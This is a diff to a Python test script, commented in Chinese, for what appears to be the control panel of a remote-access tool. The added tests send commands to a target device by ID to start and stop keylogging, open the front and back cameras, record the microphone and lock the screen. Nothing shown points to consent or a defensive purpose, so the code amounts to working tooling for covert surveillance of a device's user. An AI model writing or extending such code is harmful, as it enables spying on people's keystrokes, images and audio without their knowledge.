@@ -389,10 +389,101 @@ def run_tests(host, port, device_id):
     }, wait_sec=3)
     check_response("获取位置", expected_type="loc")
 
+    # ============ 键盘/摄像头/录音 ============
+
+    # Test 16: 开启键盘监听
+    print("[Test 16] 开启键盘监听...")
+    send_cmd({
+        "itype": "slr_panelsend",
+        "subc": "Keylog",
+        "pid": device_id,
+        "keylogtype": "0",
+        "token": token,
+    })
+    time.sleep(1)
+    results.append(("开启键盘监听", "✅ SENT", "keylogtype=0"))
+
+    # Test 17: 关闭键盘监听
+    print("[Test 17] 关闭键盘监听...")
+    send_cmd({
+        "itype": "slr_panelsend",
+        "subc": "Keylog",
+        "pid": device_id,
+        "keylogtype": "1",
+        "token": token,
+    })
+    time.sleep(1)
+    results.append(("关闭键盘监听", "✅ SENT", "keylogtype=1"))
+
+    # Test 18: 开启后置摄像头
+    print("[Test 18] 开启后置摄像头...")
+    with lock:
+        received_messages.clear()
+    send_and_check({
+        "itype": "slr_panelsend",
+        "subc": "cam",
+        "pid": device_id,
+        "SelectedCam": "back",
+        "token": token,
+    }, wait_sec=5)
+    check_response("后置摄像头", expected_type="cam")
+
+    # 关闭摄像头并等待释放
+    send_cmd({
+        "itype": "slr_panelsend",
+        "subc": "camoff",
+        "pid": device_id,
+        "token": token,
+    })
+    time.sleep(3)
+
+    # Test 19: 开启前置摄像头
+    print("[Test 19] 开启前置摄像头...")
+    with lock:
+        received_messages.clear()
+    send_and_check({
+        "itype": "slr_panelsend",
+        "subc": "cam",
+        "pid": device_id,
+        "SelectedCam": "front",
+        "token": token,
+    }, wait_sec=5)
+    check_response("前置摄像头", expected_type="cam")
+
+    # 关闭摄像头
+    send_cmd({
+        "itype": "slr_panelsend",
+        "subc": "camoff",
+        "pid": device_id,
+        "token": token,
+    })
+    time.sleep(2)
+
+    # Test 20: 开启录音
+    print("[Test 20] 开启录音 (等待8s)...")
+    with lock:
+        received_messages.clear()
+    send_and_check({
+        "itype": "slr_panelsend",
+        "subc": "mic",
+        "pid": device_id,
+        "token": token,
+    }, wait_sec=8)
+    check_response("录音", expected_type="mic")
+
+    # 关闭录音
+    send_cmd({
+        "itype": "slr_panelsend",
+        "subc": "micoff",
+        "pid": device_id,
+        "token": token,
+    })
+    time.sleep(1)
+
     # ============ 锁屏测试 (最后执行，可能导致断连) ============
 
-    # Test 16: 锁屏
-    print("[Test 16] 锁屏...")
+    # Test 21: 锁屏
+    print("[Test 21] 锁屏...")
     send_cmd({
         "itype": "slr_panel",
         "subc": "screen",
@@ -405,7 +496,7 @@ def run_tests(host, port, device_id):
     results.append(("锁屏", "✅ SENT", "lockit=1"))
 
     # Test 17: 解锁
-    print("[Test 17] 解锁...")
+    print("[Test 22] 解锁...")
     send_cmd({
         "itype": "slr_panel",
         "subc": "screen",
